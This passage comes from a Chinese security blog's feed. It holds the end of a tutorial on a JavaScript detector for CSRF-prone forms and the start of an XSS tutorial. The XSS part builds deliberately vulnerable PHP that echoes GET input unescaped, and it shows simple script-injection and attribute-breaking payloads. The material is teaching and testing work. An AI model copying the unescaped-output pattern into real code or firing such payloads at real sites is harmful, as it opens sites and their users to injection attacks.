class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后就是使用JavaScript的some函数来对action进行判断，当action里的值满足于我们之前设置的黑名单里的字符串时，就直接pass，使用<code>continue</code>来跳出初始化表达式变量为i的本次循环。转化成代码就是下面这样：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(formDom.attr(<span class="string">"action"</span>) != <span class="literal">undefined</span>)&#123;</div><div class="line">    <span class="keyword">var</span> actionCheck = actionFilterKeyword.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">        <span class="keyword">return</span> (formDom.attr(<span class="string">"action"</span>).toLowerCase().indexOf(item)  != <span class="string">"-1"</span>);</div><div class="line">    &#125;)</div><div class="line">    <span class="keyword">if</span>(actionCheck)&#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>如果对some函数不明白的，请移步：<a href="https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94).aspx</a>.aspx)<br>而在JavaScript里是严格区分大小写的，所以在上面的代码中我使用了toLowerCase()函数，来把action里的值全部转化成小写，然后在其中搜索之前设置的action黑名单，看是否存在。而对比过程如下:</p><blockquote><p>action的值–search（如果此次比对为true，则不会向下进行比对）</p><p>action的值–find</p><p>……</p></blockquote><p>其返回的结果是布尔型。在《JavaScript高级程序设计》里是这样说明some函数的:</p><p><code>对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则返回true。</code></p><p>这个时候我们可以看到some前面有一个变量。因为some返回的是布尔型，那么actionCheck变量也是一个布尔型，假设当前这个form表单里的action的值为”/searchArticle.php”。那么就会匹配到黑名单里的search字符串，那么some就会停止向下循环，直接返回true。<br>如下图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/3.png" alt=""></p><p>然后使用if判断<code>actionCheck</code>变量。如果为true，那么就使用<code>continue</code>来跳出当前的循环，不向下运行，直接开始下一个循环。</p><p>OK,上面的已经完成对form的action属性过滤了，那么下面的将对input进过白名单过滤。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> x = <span class="number">0</span>;x &lt; formDom.find(<span class="string">":text"</span>).length;x++)&#123;</div><div class="line">    <span class="keyword">var</span> inputTextCheck;</div><div class="line">    <span class="keyword">var</span> inputText =  formDom.find(<span class="string">":text"</span>).eq(x);</div><div class="line">    <span class="keyword">if</span>(inputText.attr(<span class="string">"placeholder"</span>) == <span class="literal">undefined</span>)&#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    inputTextCheck = placeholderFilterKeyword.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">        <span class="keyword">return</span> (inputText.attr(<span class="string">"placeholder"</span>).toLowerCase().indexOf(item)  != <span class="string">"-1"</span>);</div><div class="line">    &#125;)</div><div class="line">    <span class="keyword">if</span>(inputTextCheck)&#123;</div><div class="line">        <span class="keyword">continue</span> outerFor;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>首先使用<code>(&quot;:text&quot;)</code>来遍历当前form表单下所有type为text的input标签。</p><p>inputTextCheck变量是为了存放some函数的布尔结果。而inputText变量代表了当前的input标签。</p><p>然后使用if判断当前input里的placeholder属性是否存在，如果不存在，则跳出初始化表达式变量为x的本次循环。不向下运行，且对下一个input标签进行之前的操作。如果存在且有值的话，if里的表达式会返回false。则这个if判断不会运行，而是向下运行，而代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">inputTextCheck = placeholderFilterKeyword.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> (inputText.attr(<span class="string">"placeholder"</span>).toLowerCase().indexOf(item)  != <span class="string">"-1"</span>);</div><div class="line">&#125;)</div><div class="line"><span class="keyword">if</span>(inputTextCheck)&#123;</div><div class="line">    <span class="keyword">continue</span> outerFor;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>和之前判断action的情况的是一样的，这里就不在阐述了。</p><h4 id="0x03-去除没有提交按钮的form表单："><a href="#0x03-去除没有提交按钮的form表单：" class="headerlink" title="0x03 去除没有提交按钮的form表单："></a>0x03 去除没有提交按钮的form表单：</h4><hr><p>为什么要写这个，因为有些form表单不是给用户使用的，他没有提交按钮。对用户来说也是不可见状态。而且也不涉及较为核心的操作，那么我们就需要把这个表单剔除掉。代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(formDom.find(<span class="string">":submit"</span>).length &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">continue</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这段代码较为简单，这里也不在阐述了。</p><h4 id="0x04-去除具有token的form表单："><a href="#0x04-去除具有token的form表单：" class="headerlink" title="0x04 去除具有token的form表单："></a>0x04 去除具有token的form表单：</h4><hr><p>大家都知道对于CSRF来说，具有token的form表单基本是可以断定是不存在CSRF漏洞的了，当然排除同页面存在XSS漏洞和CSRF漏洞。</p><p>而token，我们应该怎么样发现呢？type为hidden？name包含token？，不不不。这些都不准确，没办法减少误报和扩大结果。那我们应该怎么做呢？<b>判断type为hidden的input标签里的value值的长度是否大于10</b>。</p><p>具有token功能的input标签的特殊性：</p><blockquote><ol><li><p>type为hidden</p></li><li><p>为了安全起见，token一般是不会小于10位数的。</p></li><li><p>总是以input标签为媒介的方式传输给后端服务器中。</p></li></ol></blockquote><p>OK,那么我们可以遍历当前form表单下所有type为hidden的input标签，再判断value值是否大于10。如果大于10，说明这个表单很大程度上是具有token验证的表单，将会被程序丢弃。跳出初始化表达式变量为i的本次循环。把上面的话转化成代码就是下面这样：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; formDom.find(<span class="string">":hidden"</span>).length;j++)&#123;</div><div class="line">    <span class="keyword">if</span>(formDom.find(<span class="string">":hidden"</span>).eq(j).val().length &gt; <span class="number">10</span>)&#123;</div><div class="line">        <span class="keyword">continue</span> outerFor;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>程序不复杂，复杂的思路。所以这里看起来代码其实也了没多少，而且相当的简单。所以这里就不对代码进行阐述了。</p><h4 id="0x05-去除带有验证码的form表单："><a href="#0x05-去除带有验证码的form表单：" class="headerlink" title="0x05 去除带有验证码的form表单："></a>0x05 去除带有验证码的form表单：</h4><hr><p>有了之前写自动化检测XSS项目的经验，这里思路就清晰多了。获取img的src属性里的值，判断后缀是否为图片格式。代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(formDom.find(<span class="string">"img"</span>).length &gt; <span class="number">0</span>)&#123;</div><div class="line">    <span class="keyword">var</span> imageCheck;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> z = <span class="number">0</span>;z &lt; formDom.find(<span class="string">"img"</span>).length;z++)&#123;</div><div class="line">        <span class="keyword">var</span> img = formDom.find(<span class="string">"img"</span>).eq(z);</div><div class="line">        <span class="keyword">var</span> imgSrc = img.attr(<span class="string">"src"</span>)</div><div class="line">        <span class="keyword">if</span>(!!imgSrc)&#123;</div><div class="line">            <span class="keyword">if</span>(imgSrc.indexOf(<span class="string">"?"</span>) != <span class="string">"-1"</span>)&#123;</div><div class="line">                imgSrc = imgSrc.slice(<span class="number">0</span>,imgSrc.indexOf(<span class="string">"?"</span>));</div><div class="line">            &#125;</div><div class="line">            imgSrc = imgSrc.substr(imgSrc.lastIndexOf(<span class="string">"."</span>),imgSrc.length);</div><div class="line">            imageCheck = imageFileSuffix.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">                <span class="keyword">return</span> (imgSrc == item);</div><div class="line">            &#125;)</div><div class="line">            <span class="keyword">if</span>(!imageCheck)&#123;</div><div class="line">                <span class="keyword">continue</span> outerFor;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>首先使用<code>formDom.find(&quot;img&quot;).length</code>来判断当前的form表单里是否存在图片，如果存在，那么if判断会返回true。进入if判断里面后，首先是一个变量，而这个变量是存放some函数返回的布尔结果的。</p><p>然后就是一个for循环，对当前form表单里的img表单进行遍历。而变量<code>img</code>代表了当前的img标签。而imgSrc变量代表了当前img标签里的src。</p><p>下面是一段if代码<code>if(!!imgSrc)</code>为什么要这样写呢，是强制把imgSrc变量转成布尔型的，如果当前这个img标签是不存在src属性或没有值的情况下，将会返回false，如果存在src且有值的情况下会返回true。</p><p>而下面的代码的是为了剔除<code>?</code>后面的字符串：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(imgSrc.indexOf(<span class="string">"?"</span>) != <span class="string">"-1"</span>)&#123;</div><div class="line">    imgSrc = imgSrc.slice(<span class="number">0</span>,imgSrc.indexOf(<span class="string">"?"</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>为什么要写这样的代码呢？原因很简单，未来防止验证码图片被浏览器缓存，需要再后面跟上问号和随机数字，来达到每刷新一次，就会重新请求这个图片。防止浏览器缓存图片。</p><p>而<code>imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&quot;.&quot;),imgSrc.length);</code>这段代码是剔除，除了后缀之外所有的字符串。只保留后缀。举个例子，有段img标签是这样写的：<br><code>&lt;img src=&quot;https://wwww.baidu.com/code.php?rand=458711541&quot;&gt;</code>，而运行上面的代码后，结果只有<code>.php</code>了，剩下的字符串已经被剔除掉了。</p><p>而下面的some函数，和之前是一样的，不做阐述。只是if里面的表达式里多了一个<code>!取反</code>感叹号。为什么要这样写呢。因为之前的都是黑名单的形式，而这里的白名单的形式，既然是相反的，那么就使用<code>!取反</code>就行了。</p><h4 id="0x06-其他："><a href="#0x06-其他：" class="headerlink" title="0x06 其他："></a>0x06 其他：</h4><p>整套代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">outerFor:</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; $(<span class="string">"form"</span>).length;i++)&#123;</div><div class="line">    <span class="keyword">var</span> formDom = $(<span class="string">"form"</span>).eq(i);</div><div class="line">    <span class="keyword">var</span> imageFileSuffix = [<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpge'</span>,<span class="string">'.ico'</span>,<span class="string">'.gif'</span>,<span class="string">'.bmp'</span>];</div><div class="line">    <span class="keyword">var</span> placeholderFilterKeyword = [<span class="string">'跳'</span>,<span class="string">'搜'</span>,<span class="string">'查'</span>,<span class="string">'找'</span>,<span class="string">'登陆'</span>,<span class="string">'注册'</span>,<span class="string">'search'</span>];</div><div class="line">    <span class="keyword">var</span> actionFilterKeyword = [<span class="string">'search'</span>,<span class="string">'find'</span>,<span class="string">'login'</span>,<span class="string">'reg'</span>];</div><div class="line">    <span class="comment">//去除类似搜索、页面跳转等无用的form表单</span></div><div class="line">    <span class="keyword">if</span>(formDom.attr(<span class="string">"action"</span>) != <span class="literal">undefined</span>)&#123;</div><div class="line">        <span class="keyword">var</span> actionCheck = actionFilterKeyword.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">            <span class="keyword">return</span> (formDom.attr(<span class="string">"action"</span>).toLowerCase().indexOf(item)  != <span class="string">"-1"</span>);</div><div class="line">        &#125;)</div><div class="line">        <span class="keyword">if</span>(actionCheck)&#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> x = <span class="number">0</span>;x &lt; formDom.find(<span class="string">":text"</span>).length;x++)&#123;</div><div class="line">        <span class="keyword">var</span> inputTextCheck;</div><div class="line">        <span class="keyword">var</span> inputText =  formDom.find(<span class="string">":text"</span>).eq(x);</div><div class="line">        <span class="keyword">if</span>(inputText.attr(<span class="string">"placeholder"</span>) == <span class="literal">undefined</span>)&#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        inputTextCheck = placeholderFilterKeyword.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">            <span class="keyword">return</span> (inputText.attr(<span class="string">"placeholder"</span>).toLowerCase().indexOf(item)  != <span class="string">"-1"</span>);</div><div class="line">        &#125;)</div><div class="line">        <span class="keyword">if</span>(inputTextCheck)&#123;</div><div class="line">            <span class="keyword">continue</span> outerFor;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//去除没有提交按钮的form表单</span></div><div class="line">    <span class="keyword">if</span>(formDom.find(<span class="string">":submit"</span>).length &lt; <span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//去除具有token的form表单</span></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; formDom.find(<span class="string">":hidden"</span>).length;j++)&#123;</div><div class="line">        <span class="keyword">if</span>(formDom.find(<span class="string">":hidden"</span>).eq(j).val().length &gt; <span class="number">10</span>)&#123;</div><div class="line">            <span class="keyword">continue</span> outerFor;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//去除带有验证码的form表单</span></div><div class="line">    <span class="keyword">if</span>(formDom.find(<span class="string">"img"</span>).length &gt; <span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">var</span> imageCheck;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> z = <span class="number">0</span>;z &lt; formDom.find(<span class="string">"img"</span>).length;z++)&#123;</div><div class="line">            <span class="keyword">var</span> img = formDom.find(<span class="string">"img"</span>).eq(z);</div><div class="line">            <span class="keyword">var</span> imgSrc = img.attr(<span class="string">"src"</span>)</div><div class="line">            <span class="keyword">if</span>(!!imgSrc)&#123;</div><div class="line">                <span class="keyword">if</span>(imgSrc.indexOf(<span class="string">"?"</span>) != <span class="string">"-1"</span>)&#123;</div><div class="line">                    imgSrc = imgSrc.slice(<span class="number">0</span>,imgSrc.indexOf(<span class="string">"?"</span>));</div><div class="line">                &#125;</div><div class="line">                imgSrc = imgSrc.substr(imgSrc.lastIndexOf(<span class="string">"."</span>),imgSrc.length);</div><div class="line">                imageCheck = imageFileSuffix.some(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</div><div class="line">                    <span class="keyword">return</span> (imgSrc == item);</div><div class="line">                &#125;)</div><div class="line">                <span class="keyword">if</span>(!imageCheck)&#123;</div><div class="line">                    <span class="keyword">continue</span> outerFor;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(formDom)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这里的console.log(formDom)可以改为ajax等方式发包，或者alert直接提醒此页面可能具有csrf漏洞。至于如何使用，需要大伙手工打包成浏览器插件的形式。而这里我为大家附上我之前写的自动化检测XSS的插件：<a href="http://pan.baidu.com/s/1ge5VTcf" target="_blank" rel="external">http://pan.baidu.com/s/1ge5VTcf</a>。大家可以直接解包，修改里面的JavaScript代码为上面完整的代码，再重新打包就行了。</p><p>文章呢，还有很多地方不足。而这套程序还只能说是雏形，所以我没有附上直接利用的工具给大家，也是第一次这样。而且有很多地方没有考虑到，比如JSON Hijacking检测。当然下一章会完成的，也会放出可以直接利用的工具。第二章或者第三章可能会把之前写的XSS自动化检测与本章所说的自动化检测CSRF相结合起来。毕竟XSS+CSRF的危害是非常大的。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。&lt;br&gt;检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS的原理分析与解剖</title>
    <link href="http://bugs.cc/2016/05/30/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96/"/>
    <id>http://bugs.cc/2016/05/30/XSS的原理分析与解剖/</id>
    <published>2016-05-30T03:27:07.000Z</published>
    <updated>2016-08-23T16:02:38.365Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言:"></a>0×01 前言:</h3></blockquote><p>《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。</p><p>我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：</p><ol><li>耗时间</li><li>有一定几率不成功</li><li>没有相应的软件来完成自动化攻击</li><li>前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底</li><li>是一种被动的攻击手法</li><li>对website有http-only、crossdomian.xml没有用</li></ol><a id="more"></a><p>但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。”</p><blockquote><h3 id="0x02-原理："><a href="#0x02-原理：" class="headerlink" title="0x02 原理："></a>0x02 原理：</h3></blockquote><p>首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS原理重现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">        &lt;?php</div><div class="line">        $xss = $_GET['xss_input'];</div><div class="line">        echo '你输入的字符为&lt;br&gt;'.$xss;</div><div class="line">        ?&gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>然后，你会在页面看到这样的页面</p><p><img src="https://i.niupic.com/images/2016/05/30/iK1iNW.png" alt=""></p><p>我们试着输入abcd123，得到的结果为</p><p><img src="https://i.niupic.com/images/2016/05/30/HheYf8.png" alt=""></p><p>我们在看看源代码</p><p><img src="https://i.niupic.com/images/2016/05/30/aSWspi.png" alt=""></p><p>我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>会出现什么呢？如果按照上面的例子来说，它应该存在第12行的<code>&lt;br&gt;</code>与<code>&lt;/boby&gt;</code>之间，变成<code>&lt;br&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/boby&gt;</code>，那应该会弹出对话框。</p><p>既然假设提出来，那我们来实现下这个假设成不成立吧。</p><p>我们输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，得到的页面为</p><p><img src="https://i.niupic.com/images/2016/05/30/cdFv9V.png" alt=""></p><p>成功弹窗，这个时候基本上就可以确定存在xss漏洞。</p><p>我们在看看源代码</p><p><img src="https://i.niupic.com/images/2016/05/30/ImuxHT.png" alt=""></p><p>看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用</p><blockquote><h3 id="0×03-xss利用输出的环境来构造代码"><a href="#0×03-xss利用输出的环境来构造代码" class="headerlink" title="0×03 xss利用输出的环境来构造代码:"></a>0×03 xss利用输出的环境来构造代码:</h3></blockquote><p>上节说了xss的原理，但是我们的输出点不一在<code>&lt;br&gt;</code>和<code>&lt;/boby&gt;</code>里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入</p><p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>就会弹窗。</p><p>先贴出代码:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS利用输出的环境来构造代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">h6</span>&gt;</span>请输入你想显现的字符串<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input_value"</span> <span class="attr">value</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">            &lt;?php</div><div class="line">            $xss = $_GET['xss_input_value'];</div><div class="line">            if(isset($xss))&#123;</div><div class="line">                echo '&lt;input type="text" value="'.$xss.'"&gt;';</div><div class="line">            &#125;else&#123;</div><div class="line">                echo '&lt;input type="type" value="输出"&gt;';</div><div class="line">            &#125;</div><div class="line">            ?&gt;</div><div class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p><p>下面是代码的页面</p><p><img src="https://i.niupic.com/images/2016/05/30/EeVT32.png" alt=""></p><p>这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>来测试)</p><p><img src="https://i.niupic.com/images/2016/05/30/1h5YdR.png" alt=""></p><p><img src="https://i.niupic.com/images/2016/05/30/vwP031.png" alt=""></p><p>明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码</p><p><img src="https://i.niupic.com/images/2016/05/30/QJtpQo.png" alt=""></p><p>我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>前面加个<code>&quot;&gt;</code>来闭合input标签。所以应该得到的结果为</p><p><img src="https://i.niupic.com/images/2016/05/30/UHREw4.png" alt=""></p><p>成功弹窗了，我们在看看这时的页面</p><p><img src="https://i.niupic.com/images/2016/05/30/flfTcb.png" alt=""></p><p>看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码</p><p><img src="https://i.niupic.com/images/2016/05/30/uvuo5i.png" 